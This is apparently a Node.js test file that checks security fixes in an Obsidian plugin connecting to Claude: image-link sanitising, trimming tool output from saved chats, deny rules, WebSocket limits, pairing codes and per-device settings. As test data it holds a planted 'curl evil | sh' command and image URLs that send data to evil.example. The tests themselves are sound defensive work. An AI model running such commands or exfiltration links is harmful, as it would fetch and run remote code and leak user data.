// Checks the Copilot security fixes (build 11-12 b) outside Obsidian. Run: node security.test.js [path to main.js]
const Module = require("module");
const path = require("path");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const { EventEmitter } = require("events");

let pass = 0, fail = 0;
function check(name, ok, detail) {
  if (ok) pass++; else fail++;
  console.log(`${ok ? "ok  " : "FAIL"} ${name}${detail ? `  (${detail})` : ""}`);
}

/* ----- stand-ins ----- */
const store = new Map(); // this device's local storage
const platform = { isDesktopApp: false, isTablet: false, isMobile: true };
class Plugin {
  constructor(app, manifest) { this.app = app; this.manifest = manifest; this.saved = []; }
  async loadData() { return this.data ? JSON.parse(JSON.stringify(this.data)) : null; }
  async saveData(d) { this.data = JSON.parse(JSON.stringify(d)); this.saved.push(this.data); }
  registerView() {} addRibbonIcon() {} addCommand() {} addSettingTab() {} registerEvent() {}
}
const obsidian = {
  addIcon() {}, normalizePath: (p) => p, Plugin, ItemView: class {}, PluginSettingTab: class {}, Setting: class {},
  MarkdownRenderer: {}, MarkdownView: class {}, Platform: platform, Notice: class {}, requestUrl: async () => ({}), TFile: class {},
};
const origLoad = Module._load;
Module._load = function (req, ...rest) { return req === "obsidian" ? obsidian : origLoad.call(this, req, ...rest); };
global.window = { crypto: crypto.webcrypto, localStorage: { getItem: () => null, setItem() {} } };
const spawned = [];
const cp = require("child_process");
cp.spawn = (cmd, args) => {
  spawned.push(args);
  const p = new EventEmitter();
  p.stdout = new EventEmitter(); p.stdout.setEncoding = () => {};
  p.stderr = new EventEmitter(); p.stderr.setEncoding = () => {};
  p.stdin = new EventEmitter(); p.stdin.write = () => {}; p.kill = () => {};
  return p;
};

const file = path.resolve(process.argv[2] || path.join(__dirname, "..", "main.js"));
const PluginClass = require(file);
const { safeMarkdown, trimSession, configDeny, privateDir, WsConn, Host, LOCAL_SETTINGS, newPairingCode } = PluginClass.securityCore;

/* ----- 3. pictures in replies ----- */
check("remote picture becomes a link", safeMarkdown("look ![x](https://evil.example/?d=secret)") === "look [x](https://evil.example/?d=secret)");
check("reference picture becomes a link", safeMarkdown("![x][r]\n\n[r]: https://evil.example/a.png") === "[x][r]\n\n[r]: https://evil.example/a.png");
check("vault embed stays", safeMarkdown("![[Diagram.png]]") === "![[Diagram.png]]");
check("html img is shown as text", safeMarkdown('<img src="https://evil.example/x">').startsWith("&lt;img"));
check("html iframe, video and svg are shown as text", ["<iframe src=x>", "<video src=x>", "<svg><image href=x/></svg>", "< img src=x>"].every((t) => safeMarkdown(t).includes("&lt;")));
check("code blocks are left exactly as they are", safeMarkdown("```\n![a](http://x) <img src=y>\n```") === "```\n![a](http://x) <img src=y>\n```");
check("inline code is left as it is", safeMarkdown("use `![a](b)` here") === "use `![a](b)` here");
check("ordinary text and links are untouched", safeMarkdown("a < b and [site](https://ok.example) **bold**") === "a < b and [site](https://ok.example) **bold**");

/* ----- 7. saved chats ----- */
const chat = { id: "s1", title: "t", items: [{ kind: "user", text: "hi" }, { kind: "tool", id: "t1", name: "Read", input: { file_path: "C:/v/Note.md", limit: 5 }, result: "SECRET NOTE TEXT" }, { kind: "assistant", text: "done" }] };
const trimmed = trimSession(chat);
check("saved chat drops what a tool returned", trimmed.items[1].result === "" && !JSON.stringify(trimmed).includes("SECRET"));
check("saved chat keeps what a tool was asked to do", trimmed.items[1].input.file_path === "C:/v/Note.md" && trimmed.items[1].name === "Read" && trimmed.items[1].trimmed === true);
check("saved chat keeps the words", trimmed.items[0].text === "hi" && trimmed.items[2].text === "done");
check("the chat in memory is not changed", chat.items[1].result === "SECRET NOTE TEXT");

/* ----- 2. plugin files closed to every chat ----- */
const deny = configDeny(".obsidian");
check("chats may not edit Obsidian's settings or plugins", deny.includes("Edit(./.obsidian/**)") && deny.includes("Bash(*.obsidian*)") && deny.includes("PowerShell(*.obsidian*)"));
check("a renamed config folder is closed too", configDeny(".obs").includes("Edit(./.obs/**)") && configDeny(".obs").includes("Edit(./.obsidian/**)"));
(() => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "vc-test-"));
  const h = new Host({ vaultPath: tmp, configDir: ".obsidian", port: 0, bind: "local", token: "x" });
  h.tmp = tmp; h.claude = "claude"; h.chats = new Set();
  h.providerDef = () => null;
  h.childEnv = () => ({});
  h.spawnClaude("acceptEdits|sonnet|medium", null);
  const args = spawned[spawned.length - 1];
  const settings = JSON.parse(args[args.indexOf("--settings") + 1]);
  check("a Claude chat starts with the plugin folders denied", settings.permissions.deny.includes("Edit(./.obsidian/**)"), JSON.stringify(settings.permissions.deny));
})();

/* ----- 5 and 4. the host's door ----- */
function fakeSocket() {
  const s = new EventEmitter();
  s.out = []; s.ended = false; s.remoteAddress = "100.1.2.3";
  s.setNoDelay = () => {}; s.write = (b) => { s.out.push(Buffer.from(b)); }; s.end = () => { s.ended = true; }; s.destroy = () => { s.ended = true; };
  return s;
}
function frame(text, { len, fin = true } = {}) {
  const payload = Buffer.from(text);
  const n = len === undefined ? payload.length : len;
  let head;
  if (n < 126) head = Buffer.from([(fin ? 0x80 : 0) | 1, 0x80 | n]);
  else if (n < 65536) { head = Buffer.alloc(4); head[0] = (fin ? 0x80 : 0) | 1; head[1] = 0x80 | 126; head.writeUInt16BE(n, 2); }
  else { head = Buffer.alloc(10); head[0] = (fin ? 0x80 : 0) | 1; head[1] = 0x80 | 127; head.writeBigUInt64BE(BigInt(n), 2); }
  const mask = Buffer.from([1, 2, 3, 4]);
  const body = Buffer.from(payload.map((b, i) => b ^ mask[i & 3]));
  return Buffer.concat([head, mask, body]);
}
function sentTypes(sock) {
  return sock.out.map((b) => { const i = b.indexOf("{"); try { return JSON.parse(b.slice(i).toString()).type; } catch (e) { return null; } }).filter(Boolean);
}
(() => {
  const sock = fakeSocket();
  const ws = new WsConn(sock);
  let got = 0;
  ws.onmessage = () => got++;
  sock.emit("data", frame(JSON.stringify({ type: "auth", token: "x" })));
  check("a small message gets through before pairing", got === 1 && ws.open);
  sock.emit("data", frame("", { len: 200 * 1024 }).slice(0, 14));
  check("a message over 64 KB before pairing closes the connection at once", !ws.open && sock.ended, "only its header was sent");
  const sock2 = fakeSocket();
  const ws2 = new WsConn(sock2);
  ws2.onmessage = () => {};
  for (let i = 0; i < 20; i++) sock2.emit("data", frame("a".repeat(5000), { fin: false }));
  check("many small pieces adding up past 64 KB close it too", !ws2.open);
  const sock3 = fakeSocket();
  const ws3 = new WsConn(sock3);
  let size = 0;
  ws3.onmessage = (t) => { size = t.length; };
  ws3.maxMessage = 128 * 1048576;
  sock3.emit("data", frame("b".repeat(1048576)));
  check("once paired, a 1 MB message gets through", size === 1048576 && ws3.open);
})();

(() => {
  const code = newPairingCode();
  check("pairing codes are 16 characters in 4 groups", /^[A-Z2-9]{4}(-[A-Z2-9]{4}){3}$/.test(code), code);
  const host = new Host({ vaultPath: "/v", port: 0, bind: "local", token: code, version: "t" });
  host.statusMessage = () => ({});
  host.checkLogin = () => {};
  const connect = (token) => {
    const sock = fakeSocket();
    host.upgrade({ headers: { "sec-websocket-key": "dGhlIHNhbXBsZSBub25jZQ==" } }, sock);
    sock.emit("data", frame(JSON.stringify({ type: "auth", token })));
    return sock;
  };
  const wrong = connect("AAAA-BBBB-CCCC-DDDD");
  check("a wrong code is refused", sentTypes(wrong).includes("error") && wrong.ended);
  const right = connect(code);
  check("the right code is let in", sentTypes(right).includes("hello") && !right.ended);
  host.setToken(newPairingCode());
  check("a new code lets every paired device go", right.ended);
  check("the old code no longer works", connect(code).ended);
  const weak = new Host({ vaultPath: "/v", port: 0, bind: "local", token: "AB" });
  weak.statusMessage = () => ({}); weak.checkLogin = () => {};
  const sock = fakeSocket();
  weak.upgrade({ headers: { "sec-websocket-key": "k" } }, sock);
  sock.emit("data", frame(JSON.stringify({ type: "auth", token: "AB" })));
  check("a host code shorter than 16 characters lets nobody in", sock.ended && !sentTypes(sock).includes("hello"));
})();

/* ----- 6. the host's temp folder ----- */
(() => {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), "vc-priv-"));
  const p = privateDir(path.join(base, "vault-claude"));
  check("the temp folder is made", fs.statSync(p).isDirectory());
  if (process.platform !== "win32") check("only this user can open it", (fs.statSync(p).mode & 0o777) === 0o700, (fs.statSync(p).mode & 0o777).toString(8));
  const target = fs.mkdtempSync(path.join(os.tmpdir(), "vc-target-"));
  const link = path.join(base, "linked");
  let linked = false;
  try { fs.symlinkSync(target, link, "junction"); linked = true; } catch (e) { /* not allowed here */ }
  if (linked) {
    let err = null;
    try { privateDir(link); } catch (e) { err = e; }
    check("a link left in its place is refused", !!err, err && err.message);
  } else console.log("skip link check (cannot make a link here)");
})();

/* ----- 1. settings kept on each device ----- */
(async () => {
  const app = {
    vault: { getName: () => "Vault", adapter: {}, configDir: ".obsidian" },
    workspace: { onLayoutReady() {}, getLeavesOfType: () => [], on: () => ({}) },
    loadLocalStorage: (k) => (store.has(k) ? store.get(k) : null),
    saveLocalStorage: (k, v) => { store.set(k, v); },
  };
  const p = new PluginClass(app, { version: "0.9.0" });
  p.data = { serverUrl: "ws://100.9.9.9:8787", pairingCode: "OLDC-ODEO-LDCO-DEOL", hostPort: 8787, hostBind: "tailscale", claudePath: "C:/x/claude.exe", transcribeCommand: "python t.py {file}", model: "sonnet", sessions: [chat] };
  await p.onload();
  await new Promise((r) => setTimeout(r, 20));
  const saved = p.data;
  check("data.json no longer holds the pairing code, address, port, bind, Claude path or speech command", LOCAL_SETTINGS.every((k) => !(k in saved)), Object.keys(saved).join(","));
  check("other settings stay in data.json", saved.model === "sonnet" && Array.isArray(saved.sessions));
  check("the address, bind, Claude path and speech command move to this device", p.settings.serverUrl === "ws://100.9.9.9:8787" && p.settings.hostBind === "tailscale" && p.settings.claudePath === "C:/x/claude.exe" && p.settings.transcribeCommand === "python t.py {file}");
  check("the old synced pairing code is not taken over", p.settings.pairingCode === "");
  check("saved chats in data.json lose tool output", !JSON.stringify(saved).includes("SECRET"));

  // A device still on an older build writes the code and a different address back into data.json.
  p.data = Object.assign({}, saved, { pairingCode: "EVIL-EVIL-EVIL-EVIL", serverUrl: "ws://6.6.6.6:8787", transcribeCommand: "curl evil | sh" });
  await p.onExternalSettingsChange();
  check("a synced change can't point this device elsewhere or plant a command", p.settings.serverUrl === "ws://100.9.9.9:8787" && p.settings.transcribeCommand === "python t.py {file}" && p.settings.pairingCode === "");
  const p2 = new PluginClass(app, { version: "0.9.0" });
  p2.data = p.data;
  await p2.onload();
  await new Promise((r) => setTimeout(r, 20));
  check("on the next start this device's own values win over data.json", p2.settings.serverUrl === "ws://100.9.9.9:8787" && p2.settings.transcribeCommand === "python t.py {file}" && p2.settings.pairingCode === "");
  check("and data.json is cleaned again", LOCAL_SETTINGS.every((k) => !(k in p2.data)));
  p2.settings.pairingCode = "ABCD-EFGH-JKLM-NPQR";
  p2.settings.keepToolOutput = true;
  p2.settings.sessions = [chat];
  await p2.saveSettings();
  check("a code typed on this device is kept on this device, not in data.json", !JSON.stringify(p2.data).includes("ABCD-EFGH") && [...store.values()].some((v) => String(v).includes("ABCD-EFGH")));
  check("with Keep tool output on, saved chats keep it", JSON.stringify(p2.data).includes("SECRET"));

  console.log(`\n${pass} passed, ${fail} failed`);
  process.exit(fail ? 1 : 0);
})();
